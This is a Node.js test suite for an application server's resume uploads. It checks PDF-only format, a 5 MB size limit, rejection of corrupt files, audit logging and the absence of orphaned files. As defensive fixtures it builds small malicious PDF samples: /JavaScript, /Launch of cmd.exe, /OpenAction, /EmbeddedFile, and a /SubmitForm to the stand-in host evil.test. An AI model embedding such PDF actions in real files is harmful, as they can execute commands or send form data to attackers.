// server/tests/resume-security.test.js
// IPP-SR-005 / TC-Sec-06 & TC-App-01: Resume validation, size limits, and security scanning test suite.
// Acceptance criteria:
//   1. Only PDF resumes of at most 5 MB are accepted.
//   2. Non-PDF, oversized, truncated, and corrupt files are rejected (TC-Sec-06).
//   3. Active-content / exploit payloads (/JavaScript, /Launch, /OpenAction, /SubmitForm, /EmbeddedFile) are blocked with 422.
//   4. Blocked malicious uploads trigger a MALICIOUS_UPLOAD_BLOCKED audit log entry.
//   5. Rejected uploads leave zero orphaned files on disk (TC-App-01).
const fs = require('fs');
const { describe, it, before, after, beforeEach } = require('node:test');
const request = require('supertest');
const expect = require('./expect');
const app = require('../src/app');
const config = require('../src/config/env');
const Listing = require('../src/models/Listing');
const Application = require('../src/models/Application');
const AuditLog = require('../src/models/AuditLog');
const { startDb, stopDb, clearDb, createUser, listingBody, futureDate } = require('./helpers');

before(startDb);
after(async () => {
  if (fs.existsSync(config.upload.dir)) {
    fs.rmSync(config.upload.dir, { recursive: true, force: true });
  }
  await stopDb();
});
beforeEach(async () => {
  await clearDb();
  if (fs.existsSync(config.upload.dir)) {
    fs.rmSync(config.upload.dir, { recursive: true, force: true });
    fs.mkdirSync(config.upload.dir, { recursive: true });
  }
});

const VALID_PDF = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n');
const countFilesOnDisk = () => (fs.existsSync(config.upload.dir) ? fs.readdirSync(config.upload.dir).length : 0);

async function setupListing() {
  const student = await createUser({ role: 'student' });
  const recruiter = await createUser({ role: 'recruiter' });
  const listing = await Listing.create({
    ...listingBody(),
    deadline: new Date(`${futureDate()}T23:59:59.999Z`),
    company: 'CyberShield Systems',
    recruiter: recruiter.user._id,
    status: 'approved',
  });
  return { student, recruiter, listing };
}

const uploadFile = (student, listingId, buffer, opts = { filename: 'resume.pdf', contentType: 'application/pdf' }) =>
  request(app)
    .post('/api/applications')
    .set(student.auth)
    .field('listingId', String(listingId))
    .attach('resume', buffer, opts);

// ─── 1. File Type and Extension Validation (TC-Sec-06, TC-App-01) ───────────
describe('TC-Sec-06 | File format and MIME validation (IPP-SR-005)', () => {
  it('accepts a valid PDF resume within 5 MB and stores exactly one file on disk', async () => {
    const { student, listing } = await setupListing();
    const diskBefore = countFilesOnDisk();

    const res = await uploadFile(student, listing._id, VALID_PDF);
    expect(res.status).toBe(201);
    expect(res.body.application.status).toBe('Applied');
    expect(res.body.application.resumeOriginalName).toBe('resume.pdf');
    expect(countFilesOnDisk()).toBe(diskBefore + 1);
  });

  it('rejects non-PDF extensions (.docx, .png, .exe) with 400 INVALID_FILE', async () => {
    const { student, listing } = await setupListing();
    const diskBefore = countFilesOnDisk();

    const docxRes = await uploadFile(student, listing._id, VALID_PDF, { filename: 'resume.docx', contentType: 'application/pdf' });
    expect(docxRes.status).toBe(400);
    expect(docxRes.body.code).toBe('INVALID_FILE');

    const exeRes = await uploadFile(student, listing._id, VALID_PDF, { filename: 'resume.pdf.exe', contentType: 'application/pdf' });
    expect(exeRes.status).toBe(400);
    expect(exeRes.body.code).toBe('INVALID_FILE');

    expect(countFilesOnDisk()).toBe(diskBefore);
    expect(await Application.countDocuments()).toBe(0);
  });

  it('rejects spoofed MIME types claiming to be PDF', async () => {
    const { student, listing } = await setupListing();
    const diskBefore = countFilesOnDisk();

    const res = await uploadFile(student, listing._id, VALID_PDF, { filename: 'resume.pdf', contentType: 'text/plain' });
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('INVALID_FILE');
    expect(countFilesOnDisk()).toBe(diskBefore);
  });

  it('rejects files without a valid %PDF- magic byte header', async () => {
    const { student, listing } = await setupListing();
    const fakePdf = Buffer.from('MZ\x90\x00 Not a real PDF executable header %%EOF');

    const res = await uploadFile(student, listing._id, fakePdf);
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('INVALID_FILE');
    expect(countFilesOnDisk()).toBe(0);
  });

  it('rejects truncated PDFs missing the %%EOF footer', async () => {
    const { student, listing } = await setupListing();
    const truncatedPdf = Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj but no end marker');

    const res = await uploadFile(student, listing._id, truncatedPdf);
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('INVALID_FILE');
    expect(countFilesOnDisk()).toBe(0);
  });

  it('rejects empty or undersized (<16 bytes) files', async () => {
    const { student, listing } = await setupListing();
    const tiny = Buffer.from('%PDF-');

    const res = await uploadFile(student, listing._id, tiny);
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('INVALID_FILE');
    expect(countFilesOnDisk()).toBe(0);
  });
});

// ─── 2. Size Limit Enforcement (TC-Sec-06) ──────────────────────────────────
describe('TC-Sec-06 | 5 MB file size limit enforcement (IPP-SR-005)', () => {
  it('rejects files exceeding 5 MB with 413 FILE_TOO_LARGE', async () => {
    const { student, listing } = await setupListing();
    const oversized = Buffer.concat([
      Buffer.from('%PDF-1.4\n'),
      Buffer.alloc(5 * 1024 * 1024 + 64, 0x20),
      Buffer.from('\n%%EOF'),
    ]);

    const res = await uploadFile(student, listing._id, oversized);
    expect(res.status).toBe(413);
    expect(res.body.code).toBe('FILE_TOO_LARGE');
    expect(countFilesOnDisk()).toBe(0);
  });

  it('accepts files within the 5 MB limit', async () => {
    const { student, listing } = await setupListing();
    const validLarge = Buffer.concat([
      Buffer.from('%PDF-1.4\n'),
      Buffer.alloc(2 * 1024 * 1024, 0x20),
      Buffer.from('\n%%EOF'),
    ]);

    const res = await uploadFile(student, listing._id, validLarge);
    expect(res.status).toBe(201);
    expect(countFilesOnDisk()).toBe(1);
  });
});

// ─── 3. Active-Content & Malware Heuristic Scanning (TC-Sec-06) ─────────────
describe('TC-Sec-06 | Active-content heuristic scanner & audit logging (IPP-SR-005)', () => {
  it('blocks PDFs containing /JavaScript and records a MALICIOUS_UPLOAD_BLOCKED audit entry', async () => {
    const { student, listing } = await setupListing();
    const jsPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("pwned")) >>\nendobj\n%%EOF');

    const res = await uploadFile(student, listing._id, jsPdf);
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('FILE_REJECTED');
    expect(countFilesOnDisk()).toBe(0);

    const audit = await AuditLog.findOne({ action: 'MALICIOUS_UPLOAD_BLOCKED' }).lean();
    expect(audit).toBeDefined();
    expect(String(audit.actor)).toBe(String(student.user._id));
    expect(audit.metadata.filename).toBe('resume.pdf');
  });

  it('blocks PDFs containing /Launch exploit actions', async () => {
    const { student, listing } = await setupListing();
    const launchPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Launch /F (cmd.exe) >>\nendobj\n%%EOF');

    const res = await uploadFile(student, listing._id, launchPdf);
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('FILE_REJECTED');
    expect(countFilesOnDisk()).toBe(0);
  });

  it('blocks PDFs containing /OpenAction automated execution triggers', async () => {
    const { student, listing } = await setupListing();
    const openActionPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n%%EOF');

    const res = await uploadFile(student, listing._id, openActionPdf);
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('FILE_REJECTED');
    expect(countFilesOnDisk()).toBe(0);
  });

  it('blocks PDFs containing /SubmitForm data exfiltration hooks', async () => {
    const { student, listing } = await setupListing();
    const submitPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Action /S /SubmitForm /F (http://evil.test) >>\nendobj\n%%EOF');

    const res = await uploadFile(student, listing._id, submitPdf);
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('FILE_REJECTED');
    expect(countFilesOnDisk()).toBe(0);
  });

  it('blocks PDFs containing /EmbeddedFile attachments', async () => {
    const { student, listing } = await setupListing();
    const embeddedPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Filespec /EF << /F 2 0 R >> /EmbeddedFiles 3 0 R >>\nendobj\n%%EOF');

    const res = await uploadFile(student, listing._id, embeddedPdf);
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('FILE_REJECTED');
    expect(countFilesOnDisk()).toBe(0);
  });
});

// ─── 4. Zero Orphaned Files on Duplicate / Rejected Applications (TC-App-01) ──
describe('TC-App-01 | Storage cleanliness on rejected uploads (IPP-SR-005)', () => {
  it('does not store any secondary file when duplicate application is rejected', async () => {
    const { student, listing } = await setupListing();

    const first = await uploadFile(student, listing._id, VALID_PDF);
    expect(first.status).toBe(201);
    expect(countFilesOnDisk()).toBe(1);

    const dup = await uploadFile(student, listing._id, VALID_PDF);
    expect(dup.status).toBe(409);
    expect(dup.body.code).toBe('ALREADY_APPLIED');
    expect(countFilesOnDisk()).toBe(1); // exactly one file remains, no orphan
    expect(await Application.countDocuments()).toBe(1);
  });
});
